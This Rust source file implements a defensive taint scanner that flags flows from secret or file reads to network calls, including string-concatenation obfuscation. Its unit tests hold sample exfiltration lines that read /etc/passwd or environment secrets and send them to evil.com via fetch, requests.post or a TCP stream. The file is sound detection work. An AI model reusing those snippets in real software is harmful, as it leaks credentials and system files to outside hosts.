//! Line-by-line literal pattern matcher with sliding-window taint heuristic.
//!
//! Per changed source file:
//!   1. Strip comments — line-prefix `//`, `#`, or inside `/* … */`; also
//!      strip trailing ` //` and ` #` mid-line.
//!   2. Scan for source patterns (substring contains, case-sensitive).
//!   3. Scan for sink patterns.
//!   4. TaintPath: a source and sink within ±30 lines in the same file.
//!   5. Assignment tracking (lightweight): if a source line has an
//!      assignment (let/const/var/:= or simple `=`) or a brace-destructure
//!      `const { A, B } = source(...)`, record the identifier(s) and flag
//!      any sink line that mentions the identifier by name.
//!   6. File-level co-occurrence: source+sink in the same file without
//!      proximity match.

use super::{Language, PatternSet};

pub const SAME_SCOPE_WINDOW: usize = 30;

#[derive(Debug, Clone)]
pub struct FileFindings {
    pub file: String,
    pub language: Language,
    pub source_matches: Vec<Match>,
    pub sink_matches: Vec<Match>,
    pub taint_paths: Vec<TaintPath>,
    pub variable_flows: Vec<VariableFlow>,
    pub has_co_occurrence: bool,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Match {
    pub line_number: usize,
    pub line: String,
    pub pattern: String,
}

#[derive(Debug, Clone)]
pub struct TaintPath {
    pub source: Match,
    pub sink: Match,
    pub distance: usize,
}

#[derive(Debug, Clone)]
pub struct VariableFlow {
    pub source: Match,
    pub variable: String,
    pub sink: Match,
}

pub fn scan_file(
    file: &str,
    language: Language,
    content: &str,
    patterns: &PatternSet,
) -> FileFindings {
    let source_matches = scan_pattern_matches(content, &patterns.sources, MatchKind::Source);
    let sink_matches = scan_pattern_matches(content, &patterns.sinks, MatchKind::Sink);

    let mut taint_paths: Vec<TaintPath> = Vec::new();
    for src in &source_matches {
        for sink in &sink_matches {
            let distance = src.line_number.abs_diff(sink.line_number);
            if distance <= SAME_SCOPE_WINDOW {
                taint_paths.push(TaintPath {
                    source: src.clone(),
                    sink: sink.clone(),
                    distance,
                });
            }
        }
    }

    let mut variable_flows: Vec<VariableFlow> = Vec::new();
    for src in &source_matches {
        let vars = extract_assignment_targets(&src.line, language);
        for var in vars {
            for sink in &sink_matches {
                if mentions_variable(&sink.line, &var) {
                    variable_flows.push(VariableFlow {
                        source: src.clone(),
                        variable: var.clone(),
                        sink: sink.clone(),
                    });
                }
            }
        }
    }

    let has_co_occurrence = !source_matches.is_empty()
        && !sink_matches.is_empty()
        && taint_paths.is_empty()
        && variable_flows.is_empty();

    FileFindings {
        file: file.to_string(),
        language,
        source_matches,
        sink_matches,
        taint_paths,
        variable_flows,
        has_co_occurrence,
    }
}

enum MatchKind {
    Source,
    Sink,
}

fn scan_pattern_matches(content: &str, patterns: &[String], _kind: MatchKind) -> Vec<Match> {
    let mut matches = Vec::new();
    let mut in_block_comment = false;
    for (idx, raw_line) in content.lines().enumerate() {
        let cleaned = strip_comments(raw_line, &mut in_block_comment);
        if cleaned.trim().is_empty() {
            continue;
        }
        // Fold adjacent string literals: "http" + "://" + "evil.com" →
        // "http://evil.com". This unmasks the split-URL obfuscation class.
        let folded = fold_string_concats(&cleaned);
        let hay = if folded == cleaned { cleaned } else { folded };
        for pat in patterns {
            if hay.contains(pat.as_str()) {
                matches.push(Match {
                    line_number: idx,
                    line: raw_line.to_string(),
                    pattern: pat.clone(),
                });
                break;
            }
        }
    }
    matches
}

/// Collapse `"A" + "B"` (with optional whitespace) into `"AB"` on a single
/// line. Applies to single-quote, double-quote, and backtick literals.
/// Escaped quotes inside a literal are preserved.
pub fn fold_string_concats(line: &str) -> String {
    let mut out = String::with_capacity(line.len());
    let bytes = line.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        let b = bytes[i];
        if matches!(b, b'"' | b'\'' | b'`') {
            let quote = b;
            let Some(end) = find_string_end(bytes, i, quote) else {
                out.push(b as char);
                i += 1;
                continue;
            };
            let mut concat = bytes[i + 1..end].to_vec();
            let mut cursor = end + 1;
            loop {
                let anchor = cursor;
                let mut probe = cursor;
                while probe < bytes.len() && (bytes[probe] == b' ' || bytes[probe] == b'\t') {
                    probe += 1;
                }
                if probe >= bytes.len() || bytes[probe] != b'+' {
                    break;
                }
                probe += 1;
                while probe < bytes.len() && (bytes[probe] == b' ' || bytes[probe] == b'\t') {
                    probe += 1;
                }
                if probe >= bytes.len() || bytes[probe] != quote {
                    break;
                }
                let Some(next_end) = find_string_end(bytes, probe, quote) else {
                    break;
                };
                concat.extend_from_slice(&bytes[probe + 1..next_end]);
                cursor = next_end + 1;
                let _ = anchor;
            }
            out.push(quote as char);
            match std::str::from_utf8(&concat) {
                Ok(s) => out.push_str(s),
                Err(_) => {
                    for c in concat {
                        out.push(c as char);
                    }
                }
            }
            out.push(quote as char);
            i = cursor;
            continue;
        }
        out.push(b as char);
        i += 1;
    }
    out
}

fn find_string_end(bytes: &[u8], start: usize, quote: u8) -> Option<usize> {
    let mut i = start + 1;
    while i < bytes.len() {
        if bytes[i] == b'\\' && i + 1 < bytes.len() {
            i += 2;
            continue;
        }
        if bytes[i] == quote {
            return Some(i);
        }
        i += 1;
    }
    None
}

fn strip_comments(raw: &str, in_block: &mut bool) -> String {
    let mut out = String::with_capacity(raw.len());
    let bytes = raw.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if *in_block {
            if i + 1 < bytes.len() && bytes[i] == b'*' && bytes[i + 1] == b'/' {
                *in_block = false;
                i += 2;
                continue;
            }
            i += 1;
            continue;
        }
        if i + 1 < bytes.len() && bytes[i] == b'/' && bytes[i + 1] == b'*' {
            *in_block = true;
            i += 2;
            continue;
        }
        if i + 1 < bytes.len() && bytes[i] == b'/' && bytes[i + 1] == b'/' {
            break;
        }
        if bytes[i] == b'#' {
            break;
        }
        out.push(bytes[i] as char);
        i += 1;
    }
    out
}

fn mentions_variable(line: &str, var: &str) -> bool {
    let bytes = line.as_bytes();
    let vb = var.as_bytes();
    if vb.is_empty() {
        return false;
    }
    let mut i = 0;
    while i + vb.len() <= bytes.len() {
        if &bytes[i..i + vb.len()] == vb {
            let before_ok = i == 0 || !is_ident_char(bytes[i - 1]);
            let after_ok = i + vb.len() == bytes.len() || !is_ident_char(bytes[i + vb.len()]);
            if before_ok && after_ok {
                return true;
            }
        }
        i += 1;
    }
    false
}

fn is_ident_char(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_'
}

fn extract_assignment_targets(line: &str, language: Language) -> Vec<String> {
    let trimmed = line.trim_start();
    let mut out: Vec<String> = Vec::new();

    match language {
        Language::JavaScript => {
            for kw in ["const ", "let ", "var "] {
                if let Some(rest) = trimmed.strip_prefix(kw) {
                    collect_js_bindings(rest, &mut out);
                    return out;
                }
            }
            if let Some(eq) = first_toplevel_eq(trimmed) {
                let lhs = &trimmed[..eq].trim();
                if is_plain_identifier(lhs) {
                    out.push(lhs.to_string());
                }
            }
        }
        Language::Python => {
            if let Some(eq) = first_toplevel_eq(trimmed) {
                let lhs = trimmed[..eq].trim();
                if is_plain_identifier(lhs) {
                    out.push(lhs.to_string());
                } else if let Some(inner) = lhs.strip_prefix('(').and_then(|s| s.strip_suffix(')'))
                {
                    for tok in inner.split(',') {
                        let tok = tok.trim();
                        if is_plain_identifier(tok) {
                            out.push(tok.to_string());
                        }
                    }
                } else if lhs.contains(',') {
                    for tok in lhs.split(',') {
                        let tok = tok.trim();
                        if is_plain_identifier(tok) {
                            out.push(tok.to_string());
                        }
                    }
                }
            }
        }
        Language::Rust => {
            if let Some(rest) = trimmed.strip_prefix("let ") {
                let rest = rest.strip_prefix("mut ").unwrap_or(rest);
                if let Some(eq) = first_toplevel_eq(rest) {
                    let lhs = rest[..eq].trim();
                    if is_plain_identifier(lhs) {
                        out.push(lhs.to_string());
                    } else if let Some(inner) =
                        lhs.strip_prefix('(').and_then(|s| s.strip_suffix(')'))
                    {
                        for tok in inner.split(',') {
                            let tok = tok.trim();
                            if is_plain_identifier(tok) {
                                out.push(tok.to_string());
                            }
                        }
                    }
                }
            }
        }
    }
    out
}

fn collect_js_bindings(rest: &str, out: &mut Vec<String>) {
    let trimmed = rest.trim_start();
    if let Some(brace_end) = find_balanced('{', '}', trimmed) {
        let inner = &trimmed[1..brace_end];
        for tok in inner.split(',') {
            let tok = tok.split(':').next().unwrap_or("").trim();
            let tok = tok.split('=').next().unwrap_or("").trim();
            if is_plain_identifier(tok) {
                out.push(tok.to_string());
            }
        }
        return;
    }
    if let Some(brk_end) = find_balanced('[', ']', trimmed) {
        let inner = &trimmed[1..brk_end];
        for tok in inner.split(',') {
            let tok = tok.split('=').next().unwrap_or("").trim();
            if is_plain_identifier(tok) {
                out.push(tok.to_string());
            }
        }
        return;
    }
    if let Some(eq) = trimmed.find('=') {
        let lhs = trimmed[..eq].trim();
        if is_plain_identifier(lhs) {
            out.push(lhs.to_string());
        }
    }
}

fn find_balanced(open: char, close: char, s: &str) -> Option<usize> {
    let mut depth = 0i32;
    let bytes = s.as_bytes();
    for (i, c) in s.char_indices() {
        if c == open {
            depth += 1;
        } else if c == close {
            depth -= 1;
            if depth == 0 {
                return Some(i);
            }
        }
        let _ = bytes;
    }
    None
}

fn first_toplevel_eq(s: &str) -> Option<usize> {
    let mut depth = 0i32;
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let b = bytes[i];
        match b {
            b'(' | b'[' | b'{' => depth += 1,
            b')' | b']' | b'}' => depth -= 1,
            b'=' if depth == 0 => {
                let next = bytes.get(i + 1).copied().unwrap_or(0);
                let prev = if i == 0 { 0 } else { bytes[i - 1] };
                if next == b'=' || prev == b'!' || prev == b'<' || prev == b'>' || prev == b'=' {
                    i += 1;
                    continue;
                }
                return Some(i);
            }
            _ => {}
        }
        i += 1;
    }
    None
}

fn is_plain_identifier(s: &str) -> bool {
    if s.is_empty() {
        return false;
    }
    let bytes = s.as_bytes();
    let first = bytes[0];
    if !(first.is_ascii_alphabetic() || first == b'_' || first == b'$') {
        return false;
    }
    bytes[1..].iter().all(|b| is_ident_char(*b) || *b == b'$')
}

#[cfg(test)]
mod tests {
    use super::*;

    fn js_patterns() -> PatternSet {
        PatternSet::builtin(Language::JavaScript)
    }

    fn py_patterns() -> PatternSet {
        PatternSet::builtin(Language::Python)
    }

    fn rs_patterns() -> PatternSet {
        PatternSet::builtin(Language::Rust)
    }

    #[test]
    fn js_same_scope_exfil_flags_taint_and_var_flow() {
        let content = r#"
const d = fs.readFileSync('/etc/passwd');
fetch('http://evil.com', {body: d});
"#;
        let f = scan_file("index.js", Language::JavaScript, content, &js_patterns());
        assert!(!f.source_matches.is_empty());
        assert!(!f.sink_matches.is_empty());
        assert!(!f.taint_paths.is_empty(), "expected taint path");
        assert!(
            f.variable_flows.iter().any(|v| v.variable == "d"),
            "variable flow for d: {:?}",
            f.variable_flows
        );
    }

    #[test]
    fn js_destructuring_tracked() {
        let content = r#"
const { SECRET, API } = process.env;
fetch(url, {body: SECRET});
"#;
        let f = scan_file("idx.js", Language::JavaScript, content, &js_patterns());
        assert!(f.variable_flows.iter().any(|v| v.variable == "SECRET"));
    }

    #[test]
    fn comment_prefix_skipped() {
        let content = "// fs.readFileSync is dangerous\nconst safe = 1;\n";
        let f = scan_file("a.js", Language::JavaScript, content, &js_patterns());
        assert!(f.source_matches.is_empty());
    }

    #[test]
    fn trailing_comment_skipped() {
        let content = "let x = 1; // fs.readFileSync('foo')\n";
        let f = scan_file("a.js", Language::JavaScript, content, &js_patterns());
        assert!(
            f.source_matches.is_empty(),
            "trailing // comment leaked through"
        );
    }

    #[test]
    fn block_comment_skipped() {
        let content = "const x = 1; /* fs.readFileSync\n  more stuff */ const y = 2;\n";
        let f = scan_file("a.js", Language::JavaScript, content, &js_patterns());
        assert!(f.source_matches.is_empty());
    }

    #[test]
    fn python_same_scope_exfil() {
        let content = r#"
import requests, os
data = os.environ.get('SECRET')
requests.post('http://evil.com/x', data=data)
"#;
        let f = scan_file("a.py", Language::Python, content, &py_patterns());
        assert!(
            f.variable_flows.iter().any(|v| v.variable == "data"),
            "py variable flow: {:?}",
            f.variable_flows
        );
    }

    #[test]
    fn rust_same_scope_exfil() {
        let content = r#"
fn leak() {
    let s = std::env::var("SECRET").unwrap();
    let mut stream = TcpStream::connect("evil.com:1234").unwrap();
    stream.write_all(s.as_bytes()).unwrap();
}
"#;
        let f = scan_file("lib.rs", Language::Rust, content, &rs_patterns());
        assert!(!f.taint_paths.is_empty());
    }

    #[test]
    fn sink_alone_no_taint() {
        let content = "fetch('/api/health').then(r => r.text());\n";
        let f = scan_file("a.js", Language::JavaScript, content, &js_patterns());
        assert!(f.source_matches.is_empty());
        assert!(!f.sink_matches.is_empty());
        assert!(f.taint_paths.is_empty());
        assert!(!f.has_co_occurrence);
    }

    #[test]
    fn source_alone_no_taint() {
        let content = "const data = fs.readFileSync('./config.json');\n";
        let f = scan_file("a.js", Language::JavaScript, content, &js_patterns());
        assert!(f.sink_matches.is_empty());
        assert!(f.taint_paths.is_empty());
        assert!(!f.has_co_occurrence);
    }

    #[test]
    fn far_apart_only_co_occurrence() {
        let mut lines = vec!["const secret = fs.readFileSync('.env');".to_string()];
        for i in 0..50 {
            lines.push(format!("// noise line {i}"));
        }
        lines.push("fetch('http://example.com/something');".to_string());
        let content = lines.join("\n");
        let f = scan_file("a.js", Language::JavaScript, &content, &js_patterns());
        assert!(f.taint_paths.is_empty());
        assert!(f.has_co_occurrence);
    }

    #[test]
    fn mentions_variable_respects_word_boundaries() {
        assert!(mentions_variable("fetch(url, {body: data})", "data"));
        assert!(mentions_variable("data = x", "data"));
        assert!(!mentions_variable("metadata = x", "data"));
        assert!(!mentions_variable("datasheet", "data"));
    }

    #[test]
    fn extract_destructuring_variables() {
        let vars = extract_assignment_targets(
            "const { A, B, C: renamed } = process.env",
            Language::JavaScript,
        );
        assert!(vars.contains(&"A".to_string()));
        assert!(vars.contains(&"B".to_string()));
        assert!(vars.contains(&"C".to_string()) || vars.contains(&"renamed".to_string()));
    }

    #[test]
    fn fold_simple_concat() {
        assert_eq!(
            fold_string_concats(r#"fetch('http' + '://' + 'evil.com')"#),
            "fetch('http://evil.com')"
        );
    }

    #[test]
    fn fold_double_quotes() {
        assert_eq!(
            fold_string_concats(r#"x("htt" + "ps://" + "c2.example")"#),
            "x(\"https://c2.example\")"
        );
    }

    #[test]
    fn fold_leaves_variables_alone() {
        assert_eq!(
            fold_string_concats("x('http://' + domain)"),
            "x('http://' + domain)"
        );
    }

    #[test]
    fn concat_obfuscation_unmasks_sink_match() {
        let content = r#"fetch('http' + '://' + 'evil.com/exfil');"#;
        let p = PatternSet::builtin(Language::JavaScript);
        let f = scan_file("a.js", Language::JavaScript, content, &p);
        assert!(
            !f.sink_matches.is_empty(),
            "concat-obfuscated fetch call should still match"
        );
    }
}
